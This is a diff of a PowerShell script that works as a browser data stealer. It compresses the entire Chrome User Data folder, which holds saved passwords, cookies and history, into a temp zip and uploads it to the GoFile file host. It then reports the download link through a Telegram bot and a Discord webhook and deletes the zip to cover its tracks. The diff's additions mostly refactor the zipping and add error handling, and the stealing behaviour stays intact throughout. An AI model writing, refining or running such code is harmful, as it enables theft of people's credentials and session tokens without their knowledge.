@@ -11,16 +11,11 @@ $logFile = "$env:TEMP\debug_log.txt"
 
 # Function for sending messages through Telegram Bot
 function Send-TelegramMessage {
-    param (
-        [string]$message
-    )
+    param ([string]$message)
 
     if ($botToken -and $chatID) {
         $uri = "https://api.telegram.org/bot$botToken/sendMessage"
-        $body = @{
-            chat_id = $chatID
-            text = $message
-        }
+        $body = @{ chat_id = $chatID; text = $message }
 
         try {
             Invoke-RestMethod -Uri $uri -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
@@ -35,13 +30,9 @@ function Send-TelegramMessage {
 
 # Function for sending messages through Discord Webhook
 function Send-DiscordMessage {
-    param (
-        [string]$message
-    )
+    param ([string]$message)
 
-    $body = @{
-        content = $message
-    }
+    $body = @{ content = $message }
 
     try {
         Invoke-RestMethod -Uri $webhook -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
@@ -53,22 +44,20 @@ function Send-DiscordMessage {
 
 # Function to upload file and get download link
 function Upload-FileAndGetLink {
-    param (
-        [string]$filePath
-    )
+    param ([string]$filePath)
 
-    # Get URL from GoFile
-    $serverResponse = Invoke-RestMethod -Uri 'https://api.gofile.io/getServer'
-    if ($serverResponse.status -ne "ok") {
-        Add-Content -Path $logFile -Value "Failed to get server URL: $($serverResponse.status)"
-        return $null
-    }
-
-    # Define the upload URI
-    $uploadUri = "https://$($serverResponse.data.server).gofile.io/uploadFile"
-
-    # Prepare the file for uploading
     try {
+        # Get Gofile server
+        $serverResponse = Invoke-RestMethod -Uri 'https://api.gofile.io/getServer'
+        if ($serverResponse.status -ne "ok") {
+            Add-Content -Path $logFile -Value "Failed to get server URL: $($serverResponse.status)"
+            return $null
+        }
+
+        # Define upload URI
+        $uploadUri = "https://$($serverResponse.data.server).gofile.io/uploadFile"
+
+        # Upload the file
         $response = Invoke-RestMethod -Uri $uploadUri -Method Post -InFile $filePath -ContentType "multipart/form-data"
         if ($response.status -ne "ok") {
             Add-Content -Path $logFile -Value "Failed to upload file: $($response.status)"
@@ -83,37 +72,34 @@ function Upload-FileAndGetLink {
     }
 }
 
-# Function to use Windows' built-in compression
+# Function to create a ZIP file using Windows' built-in compression
 function Zip-WithWindows {
-    param (
-        [string]$sourceFolder,
-        [string]$zipPath
-    )
+    param ([string]$sourceFolder, [string]$zipPath)
 
-    # Create a compressed folder
-    $shell = New-Object -ComObject Shell.Application
-    $zipFile = $shell.NameSpace($zipPath)
-
-    if (-not $zipFile) {
-        # Create an empty ZIP file
-        Set-Content $zipPath ([System.Byte[]]@(80, 75, 5, 6, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0))
-        Start-Sleep -Seconds 1
-        $zipFile = $shell.NameSpace($zipPath)
+    try {
+        if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
+        Add-Type -Assembly "System.IO.Compression.FileSystem"
+        [System.IO.Compression.ZipFile]::CreateFromDirectory($sourceFolder, $zipPath)
+        Add-Content -Path $logFile -Value "ZIP file created successfully: $zipPath"
+    } catch {
+        Add-Content -Path $logFile -Value "Failed to create ZIP file: $_"
+        Send-DiscordMessage -message "Failed to create ZIP file."
+        exit
     }
-
-    # Add files to ZIP
-    $source = $shell.NameSpace($sourceFolder).Items()
-    $zipFile.CopyHere($source)
-
-    # Wait to finish
-    Start-Sleep -Seconds 5
 }
 
 # Define paths
 $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
 $outputZip = "$env:TEMP\chrome_data.zip"
 
-# Use built-in compression instead of 7-Zip
+# Check if Chrome data exists
+if (-not (Test-Path $chromePath)) {
+    Send-DiscordMessage -message "Chrome User Data path not found!"
+    Add-Content -Path $logFile -Value "Chrome User Data path not found!"
+    exit
+}
+
+# Use Windows compression method
 Zip-WithWindows -sourceFolder $chromePath -zipPath $outputZip
 
 # Upload the file and get the link
@@ -132,3 +118,4 @@ if ($link -ne $null) {
 # Remove the zip file after uploading
 Remove-Item $outputZip -Force
 Add-Content -Path $logFile -Value "Deleted zip file after upload."
+
